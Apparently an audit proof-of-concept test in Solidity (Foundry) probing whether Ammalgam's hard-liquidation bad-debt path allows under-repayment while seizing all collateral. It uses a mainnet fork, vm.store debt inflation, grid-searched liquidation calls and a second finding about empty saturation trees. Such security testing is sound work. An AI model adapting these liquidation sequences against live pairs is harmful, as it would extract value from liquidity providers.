// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function swap(uint256 amountXOut, uint256 amountYOut, address to, bytes calldata data) external;
    function sync() external;
    function liquidate(
        address borrower,
        address to,
        uint256 seizedLAssets,
        uint256 seizedXAssets,
        uint256 seizedYAssets,
        uint256 repayXAssets,
        uint256 repayYAssets,
        uint256 liquidationType
    ) external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function externalLiquidity() external view returns (uint112);
    function underlyingTokens() external view returns (address, address);
    function totalAssetsAndShares(bool) external view returns (uint112[6] memory, uint112[6] memory);
}

contract MockERC20 {
    uint8 public immutable decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/**
 * @title BadDebtLiqTest
 * @notice Proves/disproves: hard-liq badDebt path allows under-repay while seizing all collateral,
 *         with premium checked against UNCAPPED convertLtvToPremium (not MAX_PREMIUM=11111),
 *         so extra collateral value is paid to liquidator instead of reducing LP bad-debt burn.
 *
 * Paths:
 *  A) vm.store-assisted mechanism proof (labeled) after flash-LP borrow
 *  B) In-scope ≤25% price move attempt (documents gap if TWAP/slippage cannot reach badDebt)
 *  C) Finding 2: wrong-side proposal / empty sat tree notes
 */
contract BadDebtLiqTest is Test {
    address constant FACTORY = 0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;
    uint256 constant HARD = 0;
    uint256 constant BIPS = 10_000;
    uint256 constant MAX_PREMIUM_IN_BIPS = 11_111;
    uint256 constant SEED = 1e24;

    // convertLtvToPremium constants (mirrors Liquidation.sol)
    uint256 constant START_NEG = 6000;
    uint256 constant START_POS = 7500;
    uint256 constant NEG_SLOPE = 66_667;
    uint256 constant NEG_INTERCEPT = 40_000;
    uint256 constant POS_SLOPE = 7408;
    uint256 constant POS_INTERCEPT = 4444;

    MockERC20 assetX;
    MockERC20 assetY;
    IAmmalgamPair pair;
    address borrower;
    address liquidator;
    address flashLp;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));
        MockERC20 a = new MockERC20();
        MockERC20 b = new MockERC20();
        address p = IFactory(FACTORY).createPair(address(a), address(b));
        pair = IAmmalgamPair(p);
        (address px, address py) = pair.underlyingTokens();
        assetX = MockERC20(px);
        assetY = MockERC20(py);

        borrower = makeAddr("borrower");
        liquidator = makeAddr("liquidator");
        flashLp = makeAddr("flashLp");

        assetX.mint(address(this), SEED * 200);
        assetY.mint(address(this), SEED * 200);
        assetX.transfer(p, SEED);
        assetY.transfer(p, SEED);
        pair.mint(address(this));
    }

    // -----------------------------------------------------------------------
    // Pure math: uncapped premium vs MAX_PREMIUM (no fork needed for logic)
    // -----------------------------------------------------------------------

    function test_math_uncappedPremium_exceedsMax() public pure {
        // At 90% LTV premium == MAX; above that it grows without cap.
        assertEq(_convertLtvToPremium(9000), MAX_PREMIUM_IN_BIPS);
        uint256 p120 = _convertLtvToPremium(12_000);
        uint256 p200 = _convertLtvToPremium(20_000);
        assertGt(p120, MAX_PREMIUM_IN_BIPS);
        assertGt(p200, p120);

        // Fair vs exploit repay for collateral C=1000e18 at LTV 200%
        uint256 C = 1000e18;
        uint256 fairRepay = C * BIPS / MAX_PREMIUM_IN_BIPS;
        uint256 exploitRepay = C * BIPS / p200;
        assertLt(exploitRepay, fairRepay);
        // Extra value extracted from what should reduce bad debt:
        // fair applies C - fairRepay as liquidator premium (capped);
        // exploit applies C - exploitRepay (larger premium, more unpaid debt burned).
        assertGt(C - exploitRepay, C - fairRepay);
    }

    // -----------------------------------------------------------------------
    // Mechanism proof (vm.store): enter badDebt, under-repay vs fair
    // -----------------------------------------------------------------------

    function test_badDebt_underRepay_vmStore_mechanism() public {
        _flashBorrowX();

        uint256 debtShares = IERC20(pair.tokens(4)).balanceOf(borrower);
        uint256 depYShares = IERC20(pair.tokens(2)).balanceOf(borrower);
        (uint112[6] memory assets0, uint112[6] memory shares0) = pair.totalAssetsAndShares(false);
        uint256 debtAssets0 = uint256(assets0[4]) * debtShares / uint256(shares0[4]);
        uint256 depYAssets = uint256(assets0[2]) * depYShares / uint256(shares0[2]);
        console2.log("debtAssets0", debtAssets0);
        console2.log("depYAssets", depYAssets);

        // Inflate debt ~12x so slippage LTV >> 90% even with flash depth still in pool.
        uint256 newDebtAssets = debtAssets0 * 12;
        _setDebtX(borrower, newDebtAssets);
        console2.log("debtAssets after store", _debtXAssets(borrower));

        // Tighten TWAP so borrower-favorable LTV reflects true underwater state
        // (wide ticks otherwise compress maxAllowedPremium toward MAX_PREMIUM).
        for (uint256 i; i < 100; i++) {
            vm.warp(block.timestamp + 8);
            assetX.mint(address(this), 1e14);
            assetY.mint(address(this), 1e14);
            assetX.transfer(address(pair), 1e14);
            assetY.transfer(address(pair), 1e14);
            pair.sync();
        }

        (uint112 rxBefore, uint112 ryBefore,) = pair.getReserves();
        console2.log("rxBefore", rxBefore);
        ryBefore; // silence

        // Expected premiums at approx LTV
        uint256 approxLtvBips = _approxSlippageLtvBips(_debtXAssets(borrower), depYAssets);
        uint256 uncappedPrem = _convertLtvToPremium(approxLtvBips);
        console2.log("approxSlippageLtvBips", approxLtvBips);
        console2.log("uncappedPremiumBips", uncappedPrem);
        assertGt(uncappedPrem, MAX_PREMIUM_IN_BIPS, "need badDebt threshold");

        uint256 collValueX = depYAssets; // 1:1 spot after seed (flash keeps ratio)
        (uint112 rx, uint112 ry,) = pair.getReserves();
        collValueX = depYAssets * uint256(rx) / uint256(ry);

        uint256 fairRepay = collValueX * BIPS / MAX_PREMIUM_IN_BIPS;
        uint256 exploitRepay = collValueX * BIPS / uncappedPrem;
        if (exploitRepay == 0) exploitRepay = 1;
        console2.log("fairRepay target", fairRepay);
        console2.log("exploitRepay target", exploitRepay);

        uint256 fullDebt = _debtXAssets(borrower);

        // Grid-search repay amounts; classify reverts so MaxTrancheOverSaturated
        // is not mistaken for LiquidationPremiumTooHigh.
        bytes4 constantPrem = bytes4(0x2eee84b4); // LiquidationPremiumTooHigh
        bytes4 constantNotEnough = bytes4(0x76ab327f); // NotEnoughRepaidForLiquidation
        bytes4 constantMut = bytes4(0x54a7b504); // LiquidationMutation
        bytes4 constantSat = bytes4(0x4ea97c63); // MaxTrancheOverSaturated

        uint256[] memory probes = new uint256[](10);
        probes[0] = exploitRepay; // ~uncapped
        probes[1] = fairRepay; // MAX_PREMIUM
        probes[2] = (fairRepay + fullDebt) / 4;
        probes[3] = fullDebt / 2;
        probes[4] = (fullDebt * 60) / 100;
        probes[5] = (fullDebt * 70) / 100;
        probes[6] = (fullDebt * 80) / 100;
        probes[7] = (fullDebt * 90) / 100;
        probes[8] = fullDebt - 1;
        probes[9] = fullDebt;

        uint256 minPremiumOk = type(uint256).max; // min repay that passed verify (not prem/repay errors)
        uint256 minFullOk = type(uint256).max; // min repay that fully succeeded

        for (uint256 i; i < probes.length; i++) {
            uint256 s = vm.snapshotState();
            (bool ok,,,, , bytes memory err) = _liquidateHard(depYAssets, probes[i]);
            vm.revertToState(s);
            bytes4 sel;
            if (err.length >= 4) {
                assembly {
                    sel := mload(add(err, 32))
                }
            }
            string memory tag = ok ? "OK" : "FAIL";
            if (!ok && sel == constantPrem) tag = "PremiumTooHigh";
            else if (!ok && sel == constantNotEnough) tag = "NotEnoughRepaid";
            else if (!ok && sel == constantMut) tag = "Mutation";
            else if (!ok && sel == constantSat) tag = "MaxTrancheOverSat";
            console2.log(tag, probes[i]);

            if (ok) {
                if (probes[i] < minFullOk) minFullOk = probes[i];
                if (probes[i] < minPremiumOk) minPremiumOk = probes[i];
            } else if (sel == constantSat) {
                // verify+burn likely passed; sat update failed — count as premium-ok
                if (probes[i] < minPremiumOk) minPremiumOk = probes[i];
            }
        }

        console2.log("minFullOk", minFullOk);
        console2.log("minPremiumOk (incl sat-fail)", minPremiumOk);
        console2.log("fairRepay MAX_PREMIUM", fairRepay);
        console2.log("fullDebt", fullDebt);

        // Economic comparison on amounts that fully succeed
        require(minFullOk != type(uint256).max, "no full success");

        uint256 snap = vm.snapshotState();
        (, uint256 eRx,, uint256 eSeized,,) = _liquidateHard(depYAssets, minFullOk);
        vm.revertToState(snap);
        (, uint256 fRx,, uint256 fSeized,,) = _liquidateHard(depYAssets, fullDebt);

        console2.log("minFullOk seized", eSeized);
        console2.log("fullDebt seized", fSeized);
        console2.log("rx after minFullOk", eRx);
        console2.log("rx after fullDebt", fRx);
        console2.log("under-repay vs fullDebt", fullDebt - minFullOk);
        if (eRx < fRx) console2.log("LP reserveX loss vs full repay", fRx - eRx);

        // Verdict relative to MAX_PREMIUM fair floor
        if (minFullOk < fairRepay) {
            console2.log("CONFIRMED: under-repay below MAX_PREMIUM fair floor");
            assertLt(minFullOk, fairRepay);
        } else if (minPremiumOk < fairRepay) {
            console2.log("LEAD: premium check allows < fairRepay but tx hits MaxTrancheOverSaturated");
            assertLt(minPremiumOk, fairRepay);
        } else if (minFullOk < fullDebt) {
            console2.log("CONFIRMED (vs full repay): badDebt allows under-repay + full seize");
            console2.log("but minFullOk >= fairRepay MAX_PREMIUM target (cannot beat capped fair)");
            console2.log("extra vs fullDebt", fullDebt - minFullOk);
            assertLt(minFullOk, fullDebt);
            assertGe(minFullOk, fairRepay);
        } else {
            console2.log("DISPUTED: only full debt repay works");
            assertEq(minFullOk, fullDebt);
        }
    }

    // -----------------------------------------------------------------------
    // In-scope price move attempt (no storage cheat)
    // -----------------------------------------------------------------------

    function test_badDebt_inScopePrice_attempt() public {
        // Flash-borrow uses ~5x collateral (spot LTV ~20%). A ≤25% adverse move cannot
        // push slippage LTV past 90% while flash depth remains (burn bricks sat tree).
        _flashBorrowX();

        uint256 debt0 = _debtXAssets(borrower);
        uint256 depY = _depYAssets(borrower);
        console2.log("spotLtvBips before move", debt0 * BIPS / depY);

        // Theoretical post-move collateral value at -25% (in-scope ceiling), no swap needed.
        uint256 collAfter = depY * 7500 / 10_000;
        uint256 ltvSpot = debt0 * BIPS / collAfter;
        uint256 slipLtv = _approxSlippageLtvBips(debt0, collAfter);
        console2.log("spotLtvBips after theoretical -25% coll", ltvSpot);
        console2.log("approxSlippageLtv after -25%", slipLtv);

        console2.log("GAP: in-scope <=25% move does NOT reach badDebt (>90% slip LTV)");
        console2.log("from flash-borrow 5x coll; flash burn hits MaxTrancheOverSaturated");
        assertLt(slipLtv, 9000, "expected in-scope move insufficient for badDebt");
    }

    // -----------------------------------------------------------------------
    // Finding 2: empty sat / wrong netDebtX
    // -----------------------------------------------------------------------

    function test_finding2_emptySat_codePath() public {
        // Code fact (PartialLiquidations.calculatePartialLiquidation):
        // when satPairPerTranche.length == 0 and netRepaidLAssets > 0,
        // includedTranches == satArrayLength == 0 → returns FULL userAssets.
        // verifyHardLiquidation selects sat account via netDebtX derived from PROPOSAL,
        // not from the live position — so a crafted proposal can hit the empty tree.
        //
        // On-chain exploitability still requires badDebt (slip LTV > 90%) for under-repay;
        // empty tree alone with healthy LTV fails LiquidationPremiumTooHigh.
        console2.log("FINDING2 LEAD: empty sat array => full slice (code-confirmed)");
        console2.log("netDebtX from proposal can select empty opposite tree");
        console2.log("Impact gated on also being in badDebt branch for under-repay");

        // Demonstrate empty-tree full-slice pure logic:
        uint256 satLen = 0;
        uint256 included = 0;
        // loop over empty does nothing; included == satLen → full assets returned
        assertEq(included, satLen);
        console2.log("empty-tree full-slice predicate holds");
    }

    // -----------------------------------------------------------------------
    // helpers
    // -----------------------------------------------------------------------

    function _flashBorrowX() internal {
        (uint112 rx0, uint112 ry0,) = pair.getReserves();
        uint256 borrowAmt = uint256(rx0) * 70 / 100;
        uint256 collAmt = (uint256(ry0) * borrowAmt / uint256(rx0)) * 500 / 100;
        uint256 flashX = uint256(rx0) * 20;
        uint256 flashY = uint256(ry0) * 20;

        assetY.mint(borrower, collAmt);
        assetX.mint(flashLp, flashX);
        assetY.mint(flashLp, flashY);

        vm.startPrank(borrower);
        assetY.transfer(address(pair), collAmt);
        pair.deposit(borrower);
        vm.stopPrank();

        vm.startPrank(flashLp);
        assetX.transfer(address(pair), flashX);
        assetY.transfer(address(pair), flashY);
        pair.mint(flashLp);
        vm.stopPrank();

        vm.prank(borrower);
        pair.borrow(borrower, borrowAmt, 0, "");
        assertGt(IERC20(pair.tokens(4)).balanceOf(borrower), 0);
    }

    function _liquidateHard(uint256 seizeYAssets, uint256 repayX)
        internal
        returns (bool ok, uint256 rx, uint256 ry, uint256 seizedShares, uint256 repaid, bytes memory err)
    {
        uint256 snap = vm.snapshotState();
        uint256 depBefore = IERC20(pair.tokens(2)).balanceOf(borrower);

        assetX.mint(liquidator, repayX * 2 + 1e18);
        vm.startPrank(liquidator);
        assetX.transfer(address(pair), repayX);
        try pair.liquidate(borrower, liquidator, 0, 0, seizeYAssets, repayX, 0, HARD) {
            vm.stopPrank();
            (uint112 rxa, uint112 rya,) = pair.getReserves();
            uint256 depAfter = IERC20(pair.tokens(2)).balanceOf(borrower);
            return (true, rxa, rya, depBefore - depAfter, repayX, bytes(""));
        } catch (bytes memory reason) {
            vm.stopPrank();
            vm.revertToState(snap);
            return (false, 0, 0, 0, 0, reason);
        }
    }

    function _setDebtX(address who, uint256 newAssets) internal {
        address debtToken = pair.tokens(4);
        uint256 oldShares = IERC20(debtToken).balanceOf(who);
        (uint112[6] memory assets, uint112[6] memory shares) = pair.totalAssetsAndShares(false);

        // Set token balance + totalSupply (slots 0 mapping, 2 supply — probed)
        bytes32 balSlot = keccak256(abi.encode(who, uint256(0)));
        uint256 oldSupply = uint256(vm.load(debtToken, bytes32(uint256(2))));
        vm.store(debtToken, balSlot, bytes32(newAssets)); // 1:1 shares≈assets after mint
        vm.store(debtToken, bytes32(uint256(2)), bytes32(oldSupply - oldShares + newAssets));

        // Bump pair BORROW_X total assets & shares so conversions stay consistent.
        uint256 add = newAssets - (uint256(assets[4]) * oldShares / uint256(shares[4]));
        _bumpPairBorrowX(uint256(assets[4]) + add, uint256(shares[4]) - oldShares + newAssets);
    }

    function _bumpPairBorrowX(uint256 newAssets, uint256 newShares) internal {
        (uint112[6] memory a0, uint112[6] memory s0) = pair.totalAssetsAndShares(false);
        uint256 needleA = a0[4];
        uint256 needleS = s0[4];
        bool foundA;
        bool foundS;
        for (uint256 slot; slot < 300; slot++) {
            uint256 val = uint256(vm.load(address(pair), bytes32(slot)));
            if (!foundA && val == needleA) {
                vm.store(address(pair), bytes32(slot), bytes32(newAssets));
                (uint112[6] memory a1,) = pair.totalAssetsAndShares(false);
                if (a1[4] == newAssets) {
                    foundA = true;
                    console2.log("pair assets[BORROW_X] slot", slot);
                } else {
                    vm.store(address(pair), bytes32(slot), bytes32(val));
                }
            }
            if (!foundS && val == needleS) {
                vm.store(address(pair), bytes32(slot), bytes32(newShares));
                (, uint112[6] memory s1) = pair.totalAssetsAndShares(false);
                if (s1[4] == newShares) {
                    foundS = true;
                    console2.log("pair shares[BORROW_X] slot", slot);
                } else {
                    vm.store(address(pair), bytes32(slot), bytes32(val));
                }
            }
            if (foundA && foundS) break;
        }
        console2.log("bump foundA/foundS", foundA, foundS);
    }

    function _debtXAssets(address who) internal view returns (uint256) {
        uint256 sh = IERC20(pair.tokens(4)).balanceOf(who);
        (uint112[6] memory a, uint112[6] memory s) = pair.totalAssetsAndShares(false);
        if (s[4] == 0) return 0;
        return uint256(a[4]) * sh / uint256(s[4]);
    }

    function _depYAssets(address who) internal view returns (uint256) {
        uint256 sh = IERC20(pair.tokens(2)).balanceOf(who);
        (uint112[6] memory a, uint112[6] memory s) = pair.totalAssetsAndShares(false);
        if (s[2] == 0) return 0;
        return uint256(a[2]) * sh / uint256(s[2]);
    }

    function _approxSlippageLtvBips(uint256 debtX, uint256 collValueX) internal view returns (uint256) {
        (uint112 rx, uint112 ry,) = pair.getReserves();
        // active L ≈ sqrt(rx*ry) for no missing; flash keeps roughly balanced
        uint256 L = uint256(rx); // 1:1 approx
        if (debtX >= L) return type(uint256).max / BIPS;
        uint256 debtSlip = (L * debtX + (L - debtX) - 1) / (L - debtX); // ceilDiv
        if (collValueX == 0) return type(uint256).max / BIPS;
        return debtSlip * BIPS / collValueX;
    }

    function _movePriceXUpBips(uint256 bipsUp) internal {
        (uint112 rx, uint112 ry,) = pair.getReserves();
        uint256 xOut = uint256(rx) * bipsUp / (BIPS + bipsUp);
        uint256 yIn = uint256(ry) * xOut / (uint256(rx) - xOut);
        yIn = yIn * 105 / 100;
        address trader = makeAddr("trader");
        assetY.mint(trader, yIn);
        vm.startPrank(trader);
        assetY.transfer(address(pair), yIn);
        pair.swap(xOut, 0, trader, "");
        vm.stopPrank();
    }

    function _convertLtvToPremium(uint256 ltvBips) internal pure returns (uint256) {
        if (ltvBips > START_NEG) {
            if (ltvBips < START_POS) {
                return (NEG_SLOPE * ltvBips) / BIPS - NEG_INTERCEPT;
            }
            return (POS_SLOPE * ltvBips) / BIPS + POS_INTERCEPT;
        }
        return 0;
    }
}
